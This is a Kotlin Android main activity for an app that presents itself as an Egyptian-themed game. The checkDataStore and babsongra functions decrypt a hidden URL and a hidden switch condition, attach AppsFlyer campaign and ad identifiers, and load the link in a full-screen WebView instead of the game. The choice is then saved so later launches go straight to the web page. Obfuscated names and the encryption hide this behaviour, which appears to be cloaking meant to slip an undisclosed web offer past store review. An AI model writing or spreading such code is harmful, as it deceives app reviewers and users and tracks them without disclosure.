package mst.mysteryof.antientegyptua

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.util.Base64
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.collectIndexed
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import mst.mysteryof.antientegyptua.databinding.ActivityMainBinding
import mst.mysteryof.antientegyptua.game.screens.GameScreen
import mst.mysteryof.antientegyptua.game.screens.LoaderScreen
import mst.mysteryof.antientegyptua.game.screens.MenuScreen
import mst.mysteryof.antientegyptua.util.AppsflyerUtil
import mst.mysteryof.antientegyptua.util.DataStoreManager
import mst.mysteryof.antientegyptua.util.Lottie
import mst.mysteryof.antientegyptua.util.Once
import mst.mysteryof.antientegyptua.util.internetConnection
import mst.mysteryof.antientegyptua.util.isPilesorbNasok
import mst.mysteryof.antientegyptua.util.log
import mst.mysteryof.antientegyptua.util.setVisible
import mst.mysteryof.antientegyptua.util.webView.WebViewFragment
import okhttp3.OkHttpClient
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Phisica = 1000
        const val APPS_KEY    = "eZFEctaxRYuEcL9wycRn5e"

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var pipijaNra              = "https://sites.google.com/view/aristocratprivacypolicy/home"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie

    val webViewFragment      = WebViewFragment(this)
    private val okHttpClient = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {

                //startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                checkDataStore()

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        when (fragmentId) {
                            R.id.libGDXFragment -> {
                                binding.root.also { rootCL ->
                                    ConstraintSet().apply {
                                        clone(rootCL)
                                        constrainPercentWidth(binding.loader.id, .22f)
                                        constrainPercentWidth(binding.internet.id, .22f)
                                    }.applyTo(rootCL)
                                }

                                webViewFragment.goneWebView()
                                setNavigationBarColor(R.color.botom)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                            }

                            Phisica -> {
                                webViewFragment.showAndOpenUrl()
                                setNavigationBarColor(R.color.white)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }

                            else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

        webViewFragment.onCreate(coroutine, binding.webStage)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "WEB" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = WEB")
                        pipijaNra = it
                        startFragmentIdFlow.emit(Phisica)
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")

                    if (isPilesorbNasok(LoaderScreen.decrypt(GameScreen.naulekMazurbek, GameScreen.secretKey))) sokoboka() else babsongra()
                }
            }
        }
    }

    private suspend fun sokoboka() {
        withContext(Dispatchers.Main) {

            startFragmentIdFlow.tryEmit(Phisica)

            val btns = listOf(binding.btnDecline , binding.btnAccept)
            btns.onEach { it.setVisible(View.VISIBLE) }

            binding.btnDecline.setOnClickListener {
                exit()
            }
            binding.btnAccept.setOnClickListener {
                btns.onEach { it.setVisible(View.GONE) }
                lottie.showLoader()
                startFragmentIdFlow.tryEmit(R.id.libGDXFragment)

                coroutine.launch(Dispatchers.IO) { DataStoreManager.Key.update { "GAME" } }

            }
        }

    }

    private fun babsongra() {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, APPS_KEY)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            completerFlow.collectIndexed { index, _ ->
                if (index == 0) {

                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val oneLink = LoaderScreen.decrypt(MenuScreen.declineKey, GameScreen.secretKey)
                    val fLink = oneLink.plus("?") +
                            "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                            "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                            "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                            "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                            "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                            "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                            "subid="  .plus(appsflyerUID).plus("&") +
                            "adid="   .plus(AppsflyerUtil.dataMap["adset_id"]   .toString()).plus("&") +
                            "compid=" .plus(AppsflyerUtil.dataMap["campaign_id"].toString()).plus("&") +
                            "push_id=".plus(appsflyerUID)

                    log("fLink: $fLink")

                    OneSignal.login(appsflyerUID ?: UUID.randomUUID().toString())
                    OneSignal.User.addTag("sub_id_6", "install")
                    OneSignal.User.addTag("sub_id_2", AppsflyerUtil.campaignSubMap["sub2"].toString())

                    pipijaNra = fLink
                    startFragmentIdFlow.tryEmit(Phisica)

                    withContext(Dispatchers.IO) {
                        DataStoreManager.Key.update { "WEB" }
                        DataStoreManager.Link.update { fLink }
                    }
                } }
        }
    }

}